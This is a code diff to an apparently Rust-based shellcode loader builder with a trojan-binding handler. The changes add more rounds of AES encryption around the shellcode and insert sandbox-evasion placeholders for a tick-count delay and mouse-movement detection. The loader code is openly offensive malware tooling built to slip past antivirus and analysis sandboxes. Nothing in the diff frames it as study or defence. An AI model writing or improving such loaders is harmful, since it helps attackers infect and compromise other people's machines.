@@ -27,6 +27,8 @@ const iv_placeholder: &str = "${iv}";
 const base64Str_placeholder: &str = "${base64Str}";
 const package_placeholder: &str = "${packageName}";
 const hexCode_placeholder: &str = "${hexCode}";
+const tick_count_placeholder: &str = "${tick_count}";
+const mouse_movement_detection_placeholder: &str = "${mouse_movement_detection}";
 
 #[derive(Serialize, Deserialize)]
 pub struct ScInfo {
@@ -55,7 +57,7 @@ impl Loader for ShellCodeHandler {
         let mut tem_str: Vec<u8> = shellcode;
         let mut vec = Vec::new();
         let mut rng = thread_rng();
-        let loop_count = rng.gen_range(1..4);
+        let loop_count = rng.gen_range(3..8);
         for i in 0..loop_count {
             let (key, iv, ciphertext) = aesEncrypt(&tem_str);
             tem_str = ciphertext;
@@ -69,7 +71,10 @@ impl Loader for ShellCodeHandler {
 
         // let mainFile_str = &mainFile_str.replace(&iv_placeholder, &iv);
         // let mainFile_str = &mainFile_str.replace(&key_placeholder, &key);
+        let tem=&self.op_time*1000;
         let mainFile_str = &mainFile_str.replace(&hexCode_placeholder, &hex::encode(&json_str));
+        let mainFile_str = &mainFile_str.replace(&tick_count_placeholder, tem.to_string().as_str());
+        let mainFile_str = &mainFile_str.replace(&mouse_movement_detection_placeholder, &self.mouse_movement_detection.to_string().as_str());
         let cargoToml_str = &cargoToml_str.replace(&package_placeholder, &self.package_name);
 
 
@@ -84,7 +89,7 @@ impl Loader for ShellCodeHandler {
         let _ = write(format!("loader/src/main.rs"), mainFile_str);
         let _ = write(format!("loader/Cargo.toml"), cargoToml_str);
         let _ = write(format!("loader/build.rs"), buildRs_str);
-        complie();
+          complie();
     }
 }
 
@@ -129,7 +134,7 @@ impl Loader for BindHandler {
         let trojan_file = read(&self.trojan_file_path).expect(&format!("文件读取失败：{}", &self.trojan_file_path));
         let _ = write(format!("loader/tep/{}.exe", file_stem_name), trojan_file);
 
-        complie();
+        //complie();
     }
 }
 
@@ -142,7 +147,7 @@ pub fn complie() {
         .expect("编译失败！");
 
     let status = cmd.wait();
-    let _ = remove_dir_all("loader");
+    let _ = remove_dir_all("loader2");
 }
 
 
@@ -150,6 +155,8 @@ pub struct ShellCodeHandler {
     pub(crate) file_path: String,
     pub(crate) package_name: String,
     pub(crate) ico: String,
+    pub(crate) op_time: i64,
+    pub(crate) mouse_movement_detection: bool,
 }
 
 pub struct BindHandler {
